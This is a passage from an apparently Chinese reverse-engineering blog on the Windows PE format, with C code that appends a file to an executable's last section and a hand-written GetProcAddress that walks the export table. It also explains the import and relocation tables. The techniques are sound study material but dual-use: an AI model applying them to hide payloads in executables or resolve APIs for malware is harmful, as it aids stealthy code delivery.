pIMAGE_DOS_HEADER = (PIMAGE_DOS_HEADER)exefilebuf;</span><br><span class="line">	PIMAGE_NT_HEADERS pIMAGE_NT_HEADERS = (PIMAGE_NT_HEADERS)(exefilebuf + pIMAGE_DOS_HEADER-&gt;e_lfanew);</span><br><span class="line">	PIMAGE_FILE_HEADER pIMAGE_FILE_HEADER = (PIMAGE_FILE_HEADER)(&amp;pIMAGE_NT_HEADERS-&gt;FileHeader);</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pIMAGE_OPTIONAL_HEADER = (PIMAGE_OPTIONAL_HEADER)(&amp;pIMAGE_NT_HEADERS-&gt;OptionalHeader);</span><br><span class="line">	PIMAGE_SECTION_HEADER pIMAGE_SECTION_HEADER = (PIMAGE_SECTION_HEADER)(pIMAGE_NT_HEADERS + <span class="number">1</span>);</span><br><span class="line">	PIMAGE_SECTION_HEADER pIMAGE_SECTION_HEADER_LAST = (PIMAGE_SECTION_HEADER)(pIMAGE_SECTION_HEADER + pIMAGE_FILE_HEADER-&gt;NumberOfSections - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 根据FileAlignment计算添加文件对齐后的大小</span></span><br><span class="line">	<span class="type">int</span> addfilealignmentlen = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (addfilelen % pIMAGE_OPTIONAL_HEADER-&gt;FileAlignment != <span class="number">0</span>) &#123;</span><br><span class="line">		addfilealignmentlen = (((addfilelen / pIMAGE_OPTIONAL_HEADER-&gt;FileAlignment) + <span class="number">1</span>) * pIMAGE_OPTIONAL_HEADER-&gt;FileAlignment);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		addfilealignmentlen = addfilelen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 根据SectionAlignment计算添加内存对齐后的大小</span></span><br><span class="line">	<span class="type">int</span> addvirtualsize = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> rawsize = pIMAGE_SECTION_HEADER_LAST-&gt;SizeOfRawData + addfilealignmentlen;</span><br><span class="line">	<span class="keyword">if</span> (rawsize &gt; pIMAGE_OPTIONAL_HEADER-&gt;SectionAlignment) &#123;</span><br><span class="line">		<span class="keyword">if</span> (rawsize % pIMAGE_OPTIONAL_HEADER-&gt;SectionAlignment != <span class="number">0</span>) &#123;</span><br><span class="line">			addvirtualsize = ((rawsize / pIMAGE_OPTIONAL_HEADER-&gt;SectionAlignment) * pIMAGE_OPTIONAL_HEADER-&gt;SectionAlignment);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			addvirtualsize = rawsize - pIMAGE_OPTIONAL_HEADER-&gt;SectionAlignment;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 新内存用于合并exe和文件</span></span><br><span class="line">	<span class="type">char</span>* copybuf = (<span class="type">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, addfilealignmentlen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memset</span>(copybuf, <span class="number">0</span>, addfilealignmentlen);</span><br><span class="line">	<span class="built_in">memcpy</span>(copybuf, addfilebuf, addfilelen);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* mergefilebuf = (<span class="type">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, exefilelen + addfilealignmentlen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(mergefilebuf, exefilebuf, exefilelen);</span><br><span class="line">	<span class="built_in">memcpy</span>(mergefilebuf + exefilelen, copybuf, addfilealignmentlen);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 修改新文件的PE结构</span></span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">int</span>*)(mergefilebuf + ((<span class="type">char</span>*)pIMAGE_SECTION_HEADER_LAST - exefilebuf) + IMAGE_SIZEOF_SHORT_NAME) = </span><br><span class="line">		pIMAGE_SECTION_HEADER_LAST-&gt;SizeOfRawData + addfilelen;</span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">int</span>*)(mergefilebuf + ((<span class="type">char</span>*)pIMAGE_SECTION_HEADER_LAST - exefilebuf) + IMAGE_SIZEOF_SHORT_NAME + <span class="number">8</span>) =</span><br><span class="line">		pIMAGE_SECTION_HEADER_LAST-&gt;SizeOfRawData + addfilealignmentlen;</span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">int</span>*)(mergefilebuf + ((<span class="type">char</span>*)&amp;pIMAGE_OPTIONAL_HEADER-&gt;SizeOfImage - exefilebuf)) =</span><br><span class="line">		pIMAGE_OPTIONAL_HEADER-&gt;SizeOfImage + addvirtualsize;</span><br><span class="line"></span><br><span class="line">	FILE* mergefile = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">errno_t</span> err = fopen_s(&amp;mergefile, mergefilepath, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fwrite(mergefilebuf, <span class="number">1</span>, exefilelen + addfilealignmentlen, mergefile);</span><br><span class="line">	fclose(mergefile);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;~Success~&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><p>首先要清楚导出表的内存偏移地址（RVA）和大小是在PE扩展头的数据目录第一个项目中记录的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IMAGE_OPTIONAL_HEADER32.DataDirectory[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如何将内存偏移地址RVA转化为文件偏移地址FA（也叫做FOA），就需要利用到节表。因为节表中同时记录了RVA和FOA，通过比较RVA可以确定导出表在哪个节中，再通过其与该节内存中的相差距离和该节的FOA相加即可得到导出表的FOA。</p>
</blockquote>
<p>接下来看导出表的结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;                   <span class="comment">// 指向该导出表文件名字符串</span></span><br><span class="line">    DWORD   Base;                   <span class="comment">// 导出函数的起始编号</span></span><br><span class="line">    DWORD   NumberOfFunctions;      <span class="comment">// 导出函数的数量</span></span><br><span class="line">    DWORD   NumberOfNames;          <span class="comment">// 以函数名字导出的函数个数</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// 导出函数地址表</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// 导出函数名称表</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// 导出函数名称序号表</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>

<p>其中最重要的就是最后三个结构体成员，<strong>AddressOfFunctions</strong>标明了每一个导出函数的地址，<strong>AddressOfNames</strong>标明了每一个以函数名字导出的函数名，<strong>AddressOfNameOrdinals</strong>标明了每一个以函数名字导出的函数序号，它是和<strong>AddressOfNames</strong>表中每一项一一对应的。这样理解起来会有些困难，再记录一下引用导出表函数的两种方式。</p>
<ol>
<li><p>利用导出函数名字引用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*myfunc)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    HMODULE myModule = LoadLibraryA(<span class="string">&quot;path to dll&quot;</span>);</span><br><span class="line">    myfunc func = (myfunc)GetProcAddress(myModule, <span class="string">&quot;函数名&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, func(<span class="number">3</span>, <span class="number">4</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GetProcAddress的工作流程如下：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240211163011006.png" alt="image-20240211163011006"></p>
</li>
<li><p>利用导出函数序号引用</p>
<blockquote>
<p>结构体中的Base起始编号是系统处理的，目的是为了保证索引缩小化，防止空间的浪费，根据用户定义的函数编号进行调整，比如我们定义三个函数的导出编号是230、231、232，那么Base就应该为230，这样AddressOfFunctions只需要三个表项，而不是233个，大大节省了空间。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*myfunc)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    HMODULE myModule = LoadLibraryA(<span class="string">&quot;path to dll&quot;</span>);</span><br><span class="line">    myfunc func = (myfunc)GetProcAddress(myModule, (LPCSTR)<span class="number">20</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, func(<span class="number">3</span>, <span class="number">4</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GetProcAddress的工作流程如下：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240211163628315.png" alt="image-20240211163628315"></p>
</li>
</ol>
<p>除上述两种情况之外，有的dll中导出的一些函数没有具体的实现，而是转发到了其他的dll中去。比如我在<strong>kernel32.dll</strong>的导出表中找到<strong>RemoveVectoredExceptionHandler</strong>符号，然而该符号在AddressOfFunctions中并未指向该函数的地址，而是指向了一串字符串<strong>NTDLL.RtlRemoveVectoredExceptionHandler</strong>，可以理解为需要再做一层GetProcAddress，到<strong>ntdll.dll</strong>中寻找<strong>RemoveVectoredExceptionHandler</strong>函数。</p>
<p>下面是自实现RVA转RAW的Demo：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">FileToMemory</span><span class="params">(<span class="type">char</span> filepath[], <span class="type">char</span>** buf)</span> &#123;</span><br><span class="line">    FILE* file = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> filelen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">errno_t</span> err = fopen_s(&amp;file, filepath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    filelen = ftell(file);</span><br><span class="line">    fseek(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    *buf = (<span class="type">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, filelen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    fread(*buf, <span class="number">1</span>, filelen, file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filelen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> exefilepath[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> exefilelen = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>* exefilebuf = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rva = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> raw = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将文件加载到内存中去</span></span><br><span class="line">    exefilelen = FileToMemory(exefilepath, &amp;exefilebuf);</span><br><span class="line">    <span class="keyword">if</span> (exefilelen &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;File is not exsiting!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取结构体</span></span><br><span class="line">    PIMAGE_DOS_HEADER pIMAGE_DOS_HEADER = (PIMAGE_DOS_HEADER)exefilebuf;</span><br><span class="line">    PIMAGE_NT_HEADERS pIMAGE_NT_HEADERS = (PIMAGE_NT_HEADERS)(exefilebuf + pIMAGE_DOS_HEADER-&gt;e_lfanew);</span><br><span class="line">    PIMAGE_FILE_HEADER pIMAGE_FILE_HEADER = (PIMAGE_FILE_HEADER)(&amp;pIMAGE_NT_HEADERS-&gt;FileHeader);</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pIMAGE_OPTIONAL_HEADER = (PIMAGE_OPTIONAL_HEADER)(&amp;pIMAGE_NT_HEADERS-&gt;OptionalHeader);</span><br><span class="line">    PIMAGE_SECTION_HEADER pIMAGE_SECTION_HEADER = (PIMAGE_SECTION_HEADER)(pIMAGE_NT_HEADERS + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raw = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Input your RVA address: &quot;</span>);</span><br><span class="line">        scanf_s(<span class="string">&quot;%llx&quot;</span>, &amp;rva, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 寻找在哪个节中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pIMAGE_FILE_HEADER-&gt;NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">// 排除.bss节</span></span><br><span class="line">            <span class="keyword">if</span> (pIMAGE_SECTION_HEADER[i].SizeOfRawData != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rva &gt;= pIMAGE_SECTION_HEADER[i].VirtualAddress &amp;&amp; rva &lt;= pIMAGE_SECTION_HEADER[i].VirtualAddress + pIMAGE_SECTION_HEADER[i].SizeOfRawData) &#123;</span><br><span class="line">                    raw = rva - pIMAGE_SECTION_HEADER[i].VirtualAddress + pIMAGE_SECTION_HEADER[i].PointerToRawData;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (raw == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Raw: 0x%llx\n&quot;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后尝试自实现GetProcAddress，只适用于32位程序的一般情况，没有考虑到转发，如果64位程序那么需要修改类型大小：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// __declspec(dllimport)</span></span><br><span class="line">FARPROC</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">MyNameGetProcAddress</span><span class="params">(</span></span><br><span class="line"><span class="params">	_In_ HMODULE hModule,</span></span><br><span class="line"><span class="params">	_In_ LPCSTR lpProcName</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pIMAGE_DOS_HEADER = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">	PIMAGE_NT_HEADERS pIMAGE_NT_HEADERS = (PIMAGE_NT_HEADERS)(pIMAGE_DOS_HEADER-&gt;e_lfanew + (DWORD)hModule);</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pIMAGE_EXPORT_DIRECTORY = (PIMAGE_EXPORT_DIRECTORY)(pIMAGE_NT_HEADERS-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress + (DWORD)hModule);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 对比函数名称</span></span><br><span class="line">	DWORD* NameAddress = (DWORD*)(pIMAGE_EXPORT_DIRECTORY-&gt;AddressOfNames + (DWORD)hModule);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pIMAGE_EXPORT_DIRECTORY-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">		<span class="type">char</span> *FuncName = (<span class="type">char</span>*)(NameAddress[i] + (DWORD)hModule);</span><br><span class="line">		<span class="comment">// printf(&quot;%s\n&quot;, FuncName);</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 如果对比成功</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(FuncName, lpProcName)) &#123;</span><br><span class="line">			<span class="comment">// 找到对应名称序号表中的内容</span></span><br><span class="line">			WORD* NameOrdinalAddress = (WORD*)(pIMAGE_EXPORT_DIRECTORY-&gt;AddressOfNameOrdinals + (DWORD)hModule);</span><br><span class="line">			WORD NameOrdinal = NameOrdinalAddress[i];</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 找到函数地址表中对应的内容</span></span><br><span class="line">			DWORD* FuncAddress = (DWORD*)(pIMAGE_EXPORT_DIRECTORY-&gt;AddressOfFunctions + (DWORD)hModule);</span><br><span class="line">			DWORD Func = FuncAddress[NameOrdinal] + (DWORD)hModule;</span><br><span class="line">			<span class="keyword">return</span> (FARPROC)Func;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// __declspec(dllimport)</span></span><br><span class="line">FARPROC</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">MyOrdinalGetProcAddress</span><span class="params">(</span></span><br><span class="line"><span class="params">	_In_ HMODULE hModule,</span></span><br><span class="line"><span class="params">	_In_ LPCSTR lpProcName</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pIMAGE_DOS_HEADER = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">	PIMAGE_NT_HEADERS pIMAGE_NT_HEADERS = (PIMAGE_NT_HEADERS)(pIMAGE_DOS_HEADER-&gt;e_lfanew + (DWORD)hModule);</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pIMAGE_EXPORT_DIRECTORY = (PIMAGE_EXPORT_DIRECTORY)(pIMAGE_NT_HEADERS-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress + (DWORD)hModule);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 找到函数地址表中对应的内容</span></span><br><span class="line">	DWORD* FuncAddress = (DWORD*)(pIMAGE_EXPORT_DIRECTORY-&gt;AddressOfFunctions + (DWORD)hModule);</span><br><span class="line">	DWORD FuncOrdinal = (DWORD)lpProcName - pIMAGE_EXPORT_DIRECTORY-&gt;Base;</span><br><span class="line">	DWORD Func = FuncAddress[FuncOrdinal] + (DWORD)hModule;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (FARPROC)Func;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// __declspec(dllimport)</span></span><br><span class="line">FARPROC</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">MyGetProcAddress</span><span class="params">(</span></span><br><span class="line"><span class="params">	_In_ HMODULE hModule,</span></span><br><span class="line"><span class="params">	_In_ LPCSTR lpProcName</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> ((DWORD)lpProcName &gt;&gt; <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> MyOrdinalGetProcAddress(hModule, lpProcName);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> MyNameGetProcAddress(hModule, lpProcName);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE Hmodule = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* func1 = MyGetProcAddress(Hmodule, <span class="string">&quot;RtlLoadString&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;func1: 0x%x\n&quot;</span>, func1);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* func2 = MyGetProcAddress(Hmodule, (LPCSTR)<span class="number">1275</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;func2: 0x%x\n&quot;</span>, func2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><p>首先要清楚导入表的内存偏移地址（RVA）和大小是在PE扩展头的数据目录第二个项目中记录的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IMAGE_OPTIONAL_HEADER32.DataDirectory[<span class="number">1</span>];</span><br></pre></td></tr></table></figure>

<p>接下来看导入表的结构体，一共是三个：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;</span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// 标明指向 IMAGE_THUNK_DATA（表示函数名字）的 RVA</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   ForwarderChain;</span><br><span class="line">    DWORD   Name;                           <span class="comment">// 导入模块的名字</span></span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// 标明指向 IMAGE_THUNK_DATA（启动后会修改成函数地址）的 RVA</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD ForwarderString;              <span class="comment">// PBYTE </span></span><br><span class="line">        DWORD Function;                     <span class="comment">// PDWORD</span></span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        DWORD AddressOfData;                <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;                           <span class="comment">// 如果不为0，则表示函数在导出序号表的序号</span></span><br><span class="line">    BYTE    Name[<span class="number">1</span>];                        <span class="comment">// 函数名字</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>

<p>在这里引用 Apollon_krj 的流程图，方便理解导入函数的过程。</p>
<blockquote>
<p>原文：<a href="https://blog.csdn.net/Apollon_krj/article/details/77417063">https://blog.csdn.net/Apollon_krj/article/details/77417063</a></p>
</blockquote>
<p>程序加载前的情况：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/20170820114145821" alt="这里写图片描述"></p>
<p>程序加载后的情况：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/20170820114205491" alt="这里写图片描述"></p>
<p>也就是说在程序加载前，<strong>OriginalFirstThunk</strong>和<strong>FirstThunk</strong>都指向PIMAGE_IMPORT_BY_NAME共用体，并且该共用体使用的成员是<strong>IMAGE_IMPORT_BY_NAME结构体</strong>；在程序加载之后，<strong>FirstThunk</strong>中的内容发生了变化，指向了函数的实际地址。<strong>需要注意的是导入表会暴露程序所使用的函数。</strong></p>
<h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><p>在程序中往往存在一些地址写死的变量，那么当程序加载的基质变化，那么这些写死的值也需要做修正，重定位就是做的这件事。重定位表的内存偏移地址（RVA）和大小是在PE扩展头的数据目录第六个项目中记录的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IMAGE_OPTIONAL_HEADER32.DataDirectory[<span class="number">5</span>];</span><br></pre></td></tr></table></figure>

<p>接下来看重定位表的结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure>

<p>依然引用 Apollon_krj 的流程图，方便理解：</p>
<blockquote>
<p>原文：<a href="https://blog.csdn.net/Apollon_krj/article/details/77370452">https://blog.csdn.net/Apollon_krj/article/details/77370452</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/20170818164751341" alt="img"></p>
<p>这里还需要解释一下图中偏移地址记录的内容，也就是结构体中的<strong>TypeOffset</strong>字段。该字段的大小是两个字节，其中高位的4位表示重定位的类型，而低位的12位表示重定位的偏移。普通的重定位类型有下面的三类：</p>
<ul>
<li>IMAGE_REL_BASED_ABSOLUTE：表示不需要进行任何修正</li>
<li>IMAGE_REL_BASED_HIGHLOW：表示需要将地址中的低16位和高16位分别进行修正</li>
<li>IMAGE_REL_BASED_DIR64：表示需要对64位指针进行修正</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    WORD Offset:<span class="number">12</span>;</span><br><span class="line">    WORD Type  :<span class="number">4</span>;</span><br><span class="line">&#125; TypeOffset;</span><br></pre></td></tr></table></figure>

<p>理解了重定位的相关结构体，那么就需要理解重定位的过程。当程序加载到内存中，所分配的基质和PE扩展头中记录的<strong>ImageBase</strong>相同时，就不需要重定位；当不相同时，就需要修改结构体的<strong>VirtualAddress</strong>进行修正。最后变量修正后的地址就是<strong>VirtualAddress</strong>成员和<strong>TypeOffset</strong>低12位相加后的值。</p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>PE</tag>
      </tags>
  </entry>
  <entry>
    <title>Off-By-Null</title>
    <url>/2023/12/26/Pwn/off_by_null/</url>
